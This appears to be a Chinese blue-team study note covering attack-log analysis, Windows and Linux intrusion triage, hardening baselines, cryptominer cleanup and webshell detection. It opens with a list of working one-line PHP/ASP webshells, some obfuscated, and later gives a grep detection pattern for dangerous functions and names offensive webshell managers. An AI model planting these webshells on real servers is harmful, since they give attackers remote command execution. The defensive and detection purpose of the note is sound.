<p>目录穿越<br>webshell<br>&lt;%eval request(“sb”)%&gt;<br>• &lt;%execute request(“sb”)%&gt;<br>• <?php eval($_POST[sb]);?><br>• <?php @eval($_POST[sb]);?><br>• <?$_POST['sa']($_POST['sb']);?><br><?php @preg_replace("/[email]/e",$_POST['h'],"error"); ?><br>• &lt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“123”))%&gt;<br>•&lt;%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-lr+k-e+k-q+k-u+k-e+k-s+kt(“c”)%&gt;(UTF-7编码格式的一句话木马)<br>• <?php @$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";@$_/*-/*-*/($/*-/*- */{"_P"./*-/*-*/"OS"./*-/*-*/"T"}[/*-/*-*/0/*-/*-*/]);?></p>
<p>信息泄露<br>配置文件访问-httpd.conf、htaccess、HTPASSWD、boot.ini、etc/passwd、Php.ini、Web.xml<br>特殊后缀-.mdb、.sql、.bak、.sav、.old、.las、.tmp、.temp、.rar、.zip、.bz、gzip、tar、.conf、inc、ini、bat、.log、stats、statistics、Web.xml<br>目录浏览-Parent Directory、Directory Listing For、Index of /、Welcome to the directory listing<br>错误信息-数据库错误信息、程序错误信息</p>
<p>网站扫描<br>恶意爬虫<br>浏览器的user-agent字段一般都比较固定；<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;Trident/5.0) ——IE 9.0；<br>不是浏览器的user-agent ，很可能就是爬虫；</p>
<p>扫描软件： user-agent字段或者单独标示自己的软件<br>综合扫描器：awvs、 appscan<br>专用扫描器：sql注入</p>
<ol start="4">
<li>攻击常见的特点</li>
</ol>
<p>攻击一般都有一定的连续性，所以一段时间会产生多条日志，并且命中特征id是有一定分布的，不能是只命中某个特征。<br>攻击一般都会借助工具进行，同一个IP地址日志间隔较小 ，可能一秒中产生几条日志，明显不是人操作浏览器的行为。<br>攻击者可能会借助一定跳板，如果IP地址是国外的，攻击嫌疑较大。</p>
<ol start="5">
<li>攻击日志分析流程</li>
</ol>
<p>基于攻击IP地址方法分析（适用日志较多的情况）<br>• 找出一个明显的攻击行为的日志<br>• 根据该日志找出攻击源IP地址<br>• 筛选出针对该IP地址的日志，这种情况下基本都是攻击，没有误报<br>• 针对该IP地址，利用前面介绍的知识，就可以看出攻击者都发起了哪些攻击</p>
<p>基于攻击方法分析（适用每类不太多的攻击）<br>• 看攻击语句，是否是明显攻击行为<br>• 如果能看出是明显的行为，就可以确定是攻击<br>• 如果不确定，还需要结合其他参数，<br>    源IP地址 ：是否出现过其他类型可以明确的攻击行为<br>    攻击时间：如果半夜或者凌晨活动比较频繁 ，可以怀疑为攻击。<br>    日志频率 ：一秒中出现几次日志，可以怀疑为攻击。<br>    攻击位置：国外的ip地址 ，可以怀疑为攻击<br>    报文语义分析：比如访问admin文件夹 ，可能是有攻击行为<br>    上述几个参数可以组合分析，进一步确定攻击</p>
<p>问题 ：<br>• 一些网站实现存在安全隐患 ，用户的一些正常流量，也可以被攻击者篡改，直接发起攻击<br>• url参数实现时直接传递sql语句<br>• url参数实现时可以传递js脚本（XSS中误报较多）<br>• url参数实现时用../进行目录穿越访问文件（目录穿越误报）<br>• url参数实现时直接调用一些系统函数<br>• url参数可以进行域名重定向<br>• 系统配置存在安全隐患</p>
<p>前面说的用户网站存在一定安全隐患是这种情况的一种<br>• 还有一种情况 ，用户的应用比较特殊，理论上所有规则都能误报<br>• 用户是一个论坛类应用，可以提交任意东西，包括文章类<br>• 用户是一个代码提交讨论网站，经常通过post表单提交代码<br>• 这类应用主要体现在学校应用中较多</p>
<h3 id="基本思路流程"><a href="#基本思路流程" class="headerlink" title="基本思路流程"></a>基本思路流程</h3><p>收集信息：收集客户信息和中毒主机信息，包括样本<br>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等<br>抑制范围：隔离使受害⾯不继续扩⼤<br>深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源<br>清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产<br>产出报告：整理并输出完整的安全事件报告</p>
<h3 id="Windows入侵排查思路"><a href="#Windows入侵排查思路" class="headerlink" title="Windows入侵排查思路"></a>Windows入侵排查思路</h3><ol>
<li>检查系统账号安全</li>
</ol>
<p>查看服务器是否有弱口令，远程管理端口是否对公网开放（使用netstat -ano 命令、或者问服务器管理员）<br>结合日志，查看管理员登录时间、用户名是否存在异常<br>lusrmgr.msc 命令查看服务器是否存在可疑账号、新增账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉<br>用 D 盾或者注册表中查看服务器是否存在隐藏账号、克隆账号<br>检查方法：Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”，导出 Windows 日志–安全，利用 Log Parser 进行分析</p>
<ol start="2">
<li>检查异常端口、进程<br>a. netstat -ano检查端口连接情况，是否有远程连接、可疑连接<br>b. 任务管理器-进程<br>检查启动项、计划任务、服务<br>检查系统相关信息<br>查看系统版本以及补丁信息<br>查找可疑目录及文件<br>日志分析</li>
</ol>
<h3 id="Linux入侵排查思路"><a href="#Linux入侵排查思路" class="headerlink" title="Linux入侵排查思路"></a>Linux入侵排查思路</h3><h4 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h4><p>who   查看当前登录用户（tty本地登陆 pts远程登录）<br>w     查看系统信息，想知道某一时刻用户的行为<br>uptime  查看登陆多久、多少用户，负载<br>last 查看登录历史</p>
<p>cat /etc/group 查看组信息</p>
<p>当前用户信息<br>id || (whoami &amp;&amp; groups) 2&gt;/dev/null</p>
<p>查看所有的用户名<br>cat /etc/passwd | cut -d: -f1</p>
<p>查看拥有bash的用户<br>cat /etc/passwd | grep “sh$”</p>
<p>查看可以远程登录的用户<br>awk ‘/$1|$6/{print $1}’ /etc/shadow</p>
<p>查看拥有sudo权限的用户<br>more /etc/sudoers | grep -v “^#|^$” | grep “ALL=(ALL)”</p>
<p>列出目前用户可执行与无法执行的指令<br>sudo -l</p>
<p>查看超级用户(uid=0),有些黑客将普通用户的uid改为0，则该普通用户也拥有了超级权限<br>awk -F: ‘$3==0{print $1}’ /etc/passwd</p>
<p>etc/passwd 存储一般的用户信息，任何人都可以访问；/etc/shadow 存储用户的密码信息，只有 root 用户可以访问</p>
<h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><p>通过 .bash_history 查看帐号执行过的系统命令<br>1、root的历史命令 histroy<br>2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号的历史命令</p>
<p>历史操作命令的清除：history -c<br>但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录</p>
<h4 id="检查异常端口"><a href="#检查异常端口" class="headerlink" title="检查异常端口"></a>检查异常端口</h4><p>netstat -antlp|more<br>查看下pid所对应的进程文件路径，<br>运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号）</p>
<h4 id="检查异常进程"><a href="#检查异常进程" class="headerlink" title="检查异常进程"></a>检查异常进程</h4><p>ps aux | grep pid</p>
<h4 id="检查开机启动项、开机启动配置文件"><a href="#检查开机启动项、开机启动配置文件" class="headerlink" title="检查开机启动项、开机启动配置文件"></a>检查开机启动项、开机启动配置文件</h4><p>/etc/rc.local<br>/etc/rc.d/rc[0~6].d</p>
<h4 id="检查定时任务"><a href="#检查定时任务" class="headerlink" title="检查定时任务"></a>检查定时任务</h4><p>crontab -l 列出某个用户cron服务的详细内容<br>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root<br>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)<br>crontab -e 使用编辑器编辑当前的crontab文件<br>如：<code>*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt</code> 每分钟写入文件</p>
<p>利用anacron实现异步定时任务调度</p>
<h4 id="重点关注"><a href="#重点关注" class="headerlink" title="重点关注"></a>重点关注</h4><p>/var/spool/cron/*<br>/etc/crontab<br>/etc/cron.d/*<br>/etc/cron.daily/*<br>/etc/cron.hourly/*<br>/etc/cron.monthly/*<br>/etc/cron.weekly/<br>/etc/anacrontab<br>/var/spool/anacron/*</p>
<p>登录失败记录：/var/log/btmp<br>最后一次登录：/var/log/lastlog<br>登录成功记录: /var/log/wtmp</p>
<h4 id="检查服务"><a href="#检查服务" class="headerlink" title="检查服务"></a>检查服务</h4><h4 id="chkconfig-–list-命令，可以查看系统运行的服务"><a href="#chkconfig-–list-命令，可以查看系统运行的服务" class="headerlink" title="chkconfig –list 命令，可以查看系统运行的服务"></a>chkconfig –list 命令，可以查看系统运行的服务</h4><h4 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a>检查异常文件</h4><h4 id="检查系统日志"><a href="#检查系统日志" class="headerlink" title="检查系统日志"></a>检查系统日志</h4><h3 id="Linux的登录日志查看文件"><a href="#Linux的登录日志查看文件" class="headerlink" title="Linux的登录日志查看文件"></a>Linux的登录日志查看文件</h3><p>日志默认存放位置：/var/log/<br>查看可登录的账户 cat/etc/passwd|grep ‘/bin/bash’<br>查看所有用户最后的登录信息 lastlog<br>查看用户最近登录信息 last 其中，/var/log/wtmp 存储登录成功的信息、btmp<br>存储登录失败的信息、utmp 存储当前正在登录的信息<br>查看当前用户登录系统情况 who</p>
<h3 id="Linux常用排查命令"><a href="#Linux常用排查命令" class="headerlink" title="Linux常用排查命令"></a>Linux常用排查命令</h3><h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h4><p>查看当前系统状态 top<br>操作系统信息 uname -a<br>查看当前系统进程信息 ps<br>查看历史命令 history<br>列出本机所有的连接和监听的端口 netstat<br>查看谁在使用某个端口 lsof</p>
<h4 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h4><p>查看当前用户登录系统情况 who<br>分析超级权限账户 awk-F： ‘{if（$3==0）print $1}’/etc/passwd<br>查看可登录的账户 cat/etc/passwd|grep ‘/bin/bash’<br>查看用户错误的登录信息 lastb<br>查看所有用户最后的登录信息 lastlog<br>查看用户最近登录信息 last<br>/var/log/ 其中，/var/log/wtmp 存储登录成功的信息、btmp存储登录失败的信息、utmp存储当前正在登录的信息<br>查看空口令账户 awk-F： ‘length（$2）==0 {print $1}’/etc/shadow</p>
<h3 id="Linux基线规范"><a href="#Linux基线规范" class="headerlink" title="Linux基线规范"></a>Linux基线规范</h3><h4 id="每个公司有每个公司的基线规范体系，但是答题分为下列五个方面"><a href="#每个公司有每个公司的基线规范体系，但是答题分为下列五个方面" class="headerlink" title="每个公司有每个公司的基线规范体系，但是答题分为下列五个方面"></a>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面</h4><h4 id="账号管理和授权"><a href="#账号管理和授权" class="headerlink" title="账号管理和授权"></a>账号管理和授权</h4><p>检查特殊账号，是否存在空密码的账户和 root 权限账户<br>禁用或删除无用账号<br>添加口令策略:/etc/login.defs修改配置文件，设置过期时间、连续认证失败次数<br>禁止 root 远程登录，限制root用户直接登录。<br>检查 su 权限。vi /etc/pam.d/su添加auth required pam_wheel.so group=test</p>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>关闭不必要的服务</p>
<p>SSH 服务安全<br>不允许 root 账号直接登录系统，PermitRootLogin=no<br>修改 SSH 使用的协议版本为 2<br>修改允许密码错误次数（默认 6 次），MaxAuthTries=3</p>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>设置 umask 值 vi /etc/profile 添加行 umask 027<br>设置登录超时 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为 TMOUT=180</p>
<h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>启用 syslogd 日志，配置日志目录权限，或者设置日志服务器</p>
<p>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查</p>
<p><a target="_blank" rel="noopener" href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></p>
<h4 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h4><p>远程登录取消 telnet 采用 ssh<br>设置 /etc/hosts.allow 和 deny<br>禁止 ICMP 重定向<br>禁止源路由转发<br>防 ssh 破解，iptables (对已经建立的所有链接都放行，限制每分钟连接 ssh 的次数)+ denyhost (添加 ip 拒绝访问)</p>
<h4 id="Linux安全基线检查"><a href="#Linux安全基线检查" class="headerlink" title="Linux安全基线检查"></a>Linux安全基线检查</h4><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1668982">https://cloud.tencent.com/developer/article/1668982</a></p>
<h3 id="Windows安全基线检查"><a href="#Windows安全基线检查" class="headerlink" title="Windows安全基线检查"></a>Windows安全基线检查</h3><p>主要包括五个方面：身份鉴别、访问控制、安全审计、资源控制、剩余信息保护</p>
<p>身份鉴别<br>更改缺省账户<br>检查Guest用户是否禁用<br>密码复杂性要求<br>密码长度最小不能小于8位<br>访问控制<br>共享账户检查<br>远程关机授权<br>本地关机<br>授权帐户登陆<br>安全审计<br>用户登录日志记录<br>系统日志完备性检查<br>登录超时管理<br>资源控制<br>登录超时管理<br>远程登录超时配置<br>剩余信息保护<br>不显示上次的用户名<br>关机前清除虚拟内存页面<br>不启用可还原的加密来存储密码</p>
<h3 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h3><p>配置：账号、授权、日志、session 过期时间（防ddos）、绑定监听地址<br>禁止：目录权限、访问外部文件、CGI、非法HTTP方法（PUT DELETE）<br>隐藏：服务版本号、重定向错误页面<br>删除：配置文件、默认安装的无用文件</p>
<h3 id="中间件常见漏洞"><a href="#中间件常见漏洞" class="headerlink" title="中间件常见漏洞"></a>中间件常见漏洞</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><p>1、PUT漏洞<br>2、短文件名猜解<br>3、远程代码执行<br>4、解析漏洞</p>
<h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>1、解析漏洞<br>2、目录遍历</p>
<h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>1、文件解析<br>2、目录遍历<br>3、CRLF注入<br>4、目录穿越</p>
<h4 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h4><p>1、远程代码执行<br>2、war后门文件部署</p>
<h4 id="jBoss"><a href="#jBoss" class="headerlink" title="jBoss"></a>jBoss</h4><p>1、反序列化漏洞<br>2、war后门文件部署</p>
<h4 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h4><p>1、反序列化漏洞<br>2、SSRF<br>3、任意文件上传<br>4、war后门文件部署</p>
<h4 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h4><p>1、FastCGI未授权访问、任意命令执行<br>2、PHPCGI远程代码执行</p>
<h3 id="Linux、Windows安全加固"><a href="#Linux、Windows安全加固" class="headerlink" title="Linux、Windows安全加固"></a>Linux、Windows安全加固</h3><h4 id="IIS服务器保护措施"><a href="#IIS服务器保护措施" class="headerlink" title="IIS服务器保护措施"></a>IIS服务器保护措施</h4><p>保持 Windows 升级<br>使用 IIS 防范工具<br>移除缺省的 Web 站点<br>如果你并不需要 FTP 和 SMTP 服务，请卸载它们<br>有规则地检查你的管理员组和服务:<br>严格控制服务器的写访问权限<br>设置复杂的密码<br>减少/排除 Web 服务器上的共享<br>禁用 TCP/IP 协议中的 NetBIOS<br>使用 TCP 端口阻塞<br>仔细检查 .bat 和 .exe 文件：每周搜索一次 .bat<br>管理 IIS 目录安全<br>使用 NTFS 安全<br>管理用户账户<br>审计 Web 服务器</p>
<h4 id="Linux系统安全加固需要注意的内容"><a href="#Linux系统安全加固需要注意的内容" class="headerlink" title="Linux系统安全加固需要注意的内容"></a>Linux系统安全加固需要注意的内容</h4><p>关闭不必要的系统服务<br>更改 SSH 默认端口<br>禁止 root 用户远程 ssh 登录<br>限制用户使用 su 命令切换 root<br>密码复杂度策略<br>检查密码重复使用次数限制<br>检查是否存在空口令账号<br>禁止同时按下 ctrl+alt+del 重启<br>禁用 telnet 服务</p>
<h3 id="框架漏洞-amp-常见命令注入漏洞"><a href="#框架漏洞-amp-常见命令注入漏洞" class="headerlink" title="框架漏洞&amp;常见命令注入漏洞"></a>框架漏洞&amp;常见命令注入漏洞</h3><p>Struts2 OGNL 注入<br>weblogic<br>fastjson<br>TP5 代码执行<br>laravel：debug mode 远程代码执行漏洞（CVE-2021-3129）<br>Spring Expression Language SPEL 表达式注入<br>Spring Security Oauth2 远程代码执行<br>Spring框架漏洞总结 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286666.html">https://www.freebuf.com/articles/web/286666.html</a></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>端口及漏洞扫描：Namp、Masscan<br>抓包：Wireshark，Burpsuite、Fiddler、HttpCanary<br>Web自动化安全扫描：Nessus、Awvs、Appscan、Xray<br>信息收集：Oneforall、hole<br>漏洞利用：MSF、CS<br>Webshell 管理：菜刀、蚁剑、冰蝎、哥斯拉</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="护网的分组和流程"><a href="#护网的分组和流程" class="headerlink" title="护网的分组和流程"></a>护网的分组和流程</h3><p>护网的分组是在领导小组之下分为防护检测组，综合研判组，应急溯源组。流程大致分为备战，临战，决战三个阶段</p>
<p>备战阶段，主要任务是进行两方面的操作，一是减少攻击面，即资产梳理，减少暴露面；二是排查风险点，即通过漏洞扫描，渗透测试，弱口令等进行自查</p>
<p>临战阶段，主要任务也大致可以分为两个部分，一是进行内部演练，发现疏忽处并进行相应整改；二是可以适当增加安全设备，比如WAF，IPS，IDS，SOC，堡垒机等</p>
<p>决战阶段，作为新人，主要就是坚守岗位，有应急日志就看自己能不能解决，不能就上报，服从上级安排，优化防护，持续整改</p>
<h3 id="蓝队研判"><a href="#蓝队研判" class="headerlink" title="蓝队研判"></a>蓝队研判</h3><p>研判工作要充分利用已有安全设备（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）根据研判标准进行筛选（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多IP的进行攻击</p>
<p>对于告警结合威胁情报库如：微步、奇安信威胁情报中心、绿盟威胁情报云等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为客户内网部署的设备，如果不是，继续进行下一步，在事件上报平台查看是否有其他人提交过，如果没有，则上报</p>
<p>然后根据流量日志，对请求数据包和返回数据包分析判断其是否为误报，需要留意 X-Forwarded-For（简称XFF）和 x-real-ip 可以了解些 webshell 工具的流量特征，尤其是免杀 webshell，有可能不会被设备识别</p>
<p>最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源</p>
<h3 id="SQL注入检测"><a href="#SQL注入检测" class="headerlink" title="SQL注入检测"></a>SQL注入检测</h3><p>SQL注入攻击检测可根据入侵事件发生的前后进行区分，在入侵前可以对 Payload 进行检测等方式以预防 SQL 注入攻击。在入侵检测后可以通过对数据库、IIS 日志等进行检查以进行判断</p>
<p>传统的SQL注入检测方法通常根据经验提取特征，然后基于规则库匹配的方法来检测是否为 SQL 注入语句，其设计一般较为复杂，且规则模式更新频繁，在此采用机器学习的方式尝试对 SQL 注入语句进行检测</p>
<h3 id="DDOS-CC应急思路以及如何防范"><a href="#DDOS-CC应急思路以及如何防范" class="headerlink" title="DDOS CC应急思路以及如何防范"></a>DDOS CC应急思路以及如何防范</h3><p>目前对于低网络层的 DDoS 攻击有一些有效的防护手段，如丢弃第一次 SYN 包，上流量防护设备，上 WAF 封禁地址等</p>
<p>比较难缠的是第七层，第八层的 CC 攻击，它会找到目标网站上比较消耗资源的关键位置，重复发起攻击以消耗 CPU/内存/数据库/IO 等资源，目前的应付手段有：</p>
<ol>
<li>优化资源消耗高位置的代码</li>
<li>增加硬件设备</li>
<li>上云</li>
<li>购买专业安全公司的安全服务</li>
<li>除此之外，隐藏服务器的真实 IP、上云 WAF、CDN、 负载均衡等设备，或者暂时将域名解析到公安网警网站等也是可以作为选择方案</li>
</ol>
<p>网络设备设施</p>
<ol>
<li>拼带宽，加大带宽，但是成本太高</li>
<li>使用硬件防火墙</li>
<li>选用高性能设备</li>
</ol>
<p>抗D思想和方案</p>
<ol>
<li>负载均衡</li>
<li>花钱买流量清洗服务</li>
<li>CDN：web 层，比如 cc 攻击</li>
<li>分布式集群防御</li>
<li>高防：防大部分攻击，udp、大型的 cc 攻击</li>
</ol>
<p>预防为主</p>
<ol>
<li>系统漏洞</li>
<li>系统资源优化</li>
<li>过滤不必要的服务和端口</li>
<li>限制特定流量：检查访问来源做适当限制</li>
</ol>
<h3 id="挖矿病毒判断-amp-挖矿常见手段-amp-处理"><a href="#挖矿病毒判断-amp-挖矿常见手段-amp-处理" class="headerlink" title="挖矿病毒判断&amp;挖矿常见手段&amp;处理"></a>挖矿病毒判断&amp;挖矿常见手段&amp;处理</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/139019250">https://zhuanlan.zhihu.com/p/139019250</a></p>
<p>挖矿木马占用系统资源进行挖矿行为，一般电脑会有以下特征</p>
<ol>
<li>系统响应缓慢</li>
<li>CPU/显卡使用率过高</li>
<li>内存/带宽占用高</li>
</ol>
<p>登录进可疑主机后，可以通过以下方式确认挖矿木马（即入侵排查流程）</p>
<ol>
<li>查看进程（系统命令 ps、Is 有可能被替换）</li>
<li>检查日志、检查系统用户</li>
<li>发现异常文件</li>
</ol>
<p>挖矿常用手段</p>
<ol>
<li>未授权访问或弱口令：Redis 未授权访问、Docker API 未授权访问、Hadoop Yarn 未授权访问、NFS 未授权访问、Rsync 弱口令、PostgreSQL 弱口令、Tomcat 弱口令、SSH 弱口令、Telnet 弱口令、Windows 远程桌面弱口令</li>
<li>远程命令执行漏洞：WebLogic XML 反序列化漏洞、Jenkins 反序列化、Jboss 远程代码执行、Spring 远程代码执行、ElasticSearch 命令执行、永恒之蓝、Struts2 系列漏洞、常见 CMS 的远程命令执行漏洞</li>
<li>新爆的高危漏洞：一般每次爆发新的高危漏洞，都会紧跟一波大规模的全网扫描利用和挖矿</li>
</ol>
<p>清除挖矿木马</p>
<ol>
<li><p>原因排查<br>一旦发现服务器被挖矿，应该首先查看挖矿进程所属的用户，根据挖矿进程的运行用户去排查该用户下是否还运行着其它进程，确定这些进程是否有上述经常被黑客利用的漏洞。如果有常见的漏洞，则应该重点对此进行排查找到原因</p>
</li>
<li><p>清除木马</p>
</li>
</ol>
<p>及时隔离主机<br>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机，对同一局域网内的其他主机进行已知漏洞的扫描和进一步利用， 所以发现挖矿现象后，在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析<br>删除文件、阻断与矿池通讯</p>
<p>iptables -A INPUT -S xmr.crypto- pool.fr -j DROP<br>iptables -A OUTPUT -d xmr.crypto- pool.fr -j DROP</p>
<ol start="3">
<li><p>清除定时任务<br>大部分挖矿进程会在受感染主机中写入定时任务来完成程序的驻留，当安全人员只清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或者直接执行挖矿脚本，导致挖矿进程清除失败</p>
</li>
<li><p>清除启动项<br>有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿进程还能重新启动，所以在清除时还应该关注启动项中的内容如果有可疑的启动项，也应该进行排查，确认是挖矿进程后，对其进行清除</p>
</li>
<li><p>kill挖矿进程<br>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底<br>在实际的清除工作中，应找到本机上运行的挖矿脚本，根据脚本的执行流程确定木马的驻留方式， 并按照顺序进行清除， 避免清除不彻底</p>
</li>
<li><p>清除公钥文件<br>在用户 home 目录的 .ssh 目录下放置 authoruzed_keys 文件，从而免密登录该机器也是一种常见的保持服务器控制权的手段。在排查过程中应该查看该文件中是否有可疑公钥信息，有的话直接删除，避免攻击者再次免密登录该主机</p>
</li>
</ol>
<h3 id="服务器存在webshell，如何处理"><a href="#服务器存在webshell，如何处理" class="headerlink" title="服务器存在webshell，如何处理"></a>服务器存在webshell，如何处理</h3><p>及时隔离主机<br>定位事件范围，查看文件 webshell 文件的创建时间，对 webshell 取证样本<br>通过创建时间结合日志分析可疑行为，以及启动用户的其他进程确定漏洞<br>清除 webshell 及残留文件，修复漏洞</p>
<h3 id="排查-shell-应该用什么命令来进行排查"><a href="#排查-shell-应该用什么命令来进行排查" class="headerlink" title="排查 shell 应该用什么命令来进行排查"></a>排查 shell 应该用什么命令来进行排查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;var&#x2F;www&#x2F;html -name &quot;*.php&quot; |xargs egrep &#39;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#39;</span><br></pre></td></tr></table></figure>

<h3 id="如何检测webshell"><a href="#如何检测webshell" class="headerlink" title="如何检测webshell"></a>如何检测webshell</h3><p>主机层面</p>
<ol>
<li>静态检测<br>静态检测通过匹配特征码，特征值，危险函数函数来查找 webshell 的方法，只能查找已知的 webshell</li>
<li>动态检测<br>webshell 传到服务器了，在执行函数时这些对于系统调用、系统配置、数据库、文件的操作动作都是可以作为判断依据</li>
<li>日志检测<br>使用 webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下 webshell 页面的访问数据和数据提交记录</li>
<li>语法检测<br>语法语义分析形式，是根据 php 语言扫描编译的实现方式，进行剥离代码、注释，分析变量、函数、字符串、语言结构的分析方式，来实现关键危险函数的捕捉方式这样可以完美解决漏报的情况但误报上</li>
</ol>
<h3 id="一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理"><a href="#一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理" class="headerlink" title="一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理"></a>一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理</h3><ol>
<li>首先是评估 0day 对自身系统的影响（这部分评估需要根据漏洞利用的利用点、是否需要交互、是否会影响系统的 CIA，是否有在野利用 poc，影响资产是否暴露在公网等很多因素决定，详情可以参考 CVSS ）</li>
<li>如果确定有影响的话且有 poc，第一件事是先分析 poc 执行后会在什么地方留下痕迹，我们有什么样的设备去采集这些痕迹所留下的数据，比如说 ntlm relay 这种，可以考虑从 Windows 事件日志当中 event_id 等于 4769 的事件入手编写对应的规则，这样的话可以利用 SIEM 或者实时日志分析平台跑起来，可以建立起初步的感知防线，后期触发告警，人肉运营也可以快速止损</li>
<li>日常建立完整的纵深防御体系，不要依赖于某一道防线</li>
</ol>
<h3 id="服务器操作系统的安全防范"><a href="#服务器操作系统的安全防范" class="headerlink" title="服务器操作系统的安全防范"></a>服务器操作系统的安全防范</h3><ol>
<li>停止运行不需要的软件（很可能成为外部攻击的入口）</li>
<li>定期实施漏洞防范措施（选定软件时确认软件的升级状况，确定打补丁方式，关注各种漏洞信息，确认漏洞调查补丁状况以及防范对策，并制定对应计划）</li>
<li>对不需要对外公开的端口或者服务加以访问限制（通过端口扫描确认各端口服务状态）</li>
<li>提高认证强度</li>
</ol>
<h3 id="怎么发现有没有被攻击"><a href="#怎么发现有没有被攻击" class="headerlink" title="怎么发现有没有被攻击"></a>怎么发现有没有被攻击</h3><p>攻击判断可以建立在设备的基础上，利用设备的告警，如果没有设备的话可以参考以下</p>
<ol>
<li>网站被攻击：网站被跳转到赌博网站，网站首页被篡改，百度快照被改，网站被植入 webshell 脚本木马，网站被 DDOS、CC 压力攻击</li>
<li>服务器被黑：服务器系统中木马病毒，服务器管理员账号密码被改，服务器被攻击者远程控制，服务器的带宽向外发包，服务器被流量攻击，ARP攻击（目前这种比较少了）</li>
<li>对登录记录、系统日志、web 日志等进行分析</li>
</ol>
<h3 id="文件上传和命令执行，有看过相关日志吗"><a href="#文件上传和命令执行，有看过相关日志吗" class="headerlink" title="文件上传和命令执行，有看过相关日志吗"></a>文件上传和命令执行，有看过相关日志吗</h3><p>文件：可能在系统有上传功能或者有文本编辑器，看一下是否有 base64 加密或者 url 加密，解码验证一下是否有恶意代码<br>系统日志：有没有 web 容器做了一些危险行为，比如 bash 反弹 shell 等<br>网络应用日志：有没有异常的网站文件，类似 webshell 等，就有可能是命令执行</p>
<h3 id="windows日志分析工具"><a href="#windows日志分析工具" class="headerlink" title="windows日志分析工具"></a>windows日志分析工具</h3><p>Log Parser、LogParser Lizard、Event Log Explorer</p>
<h3 id="Linux日志分析技巧命令"><a href="#Linux日志分析技巧命令" class="headerlink" title="Linux日志分析技巧命令"></a>Linux日志分析技巧命令</h3><p>定位有多少IP在爆破主机的root帐号</p>
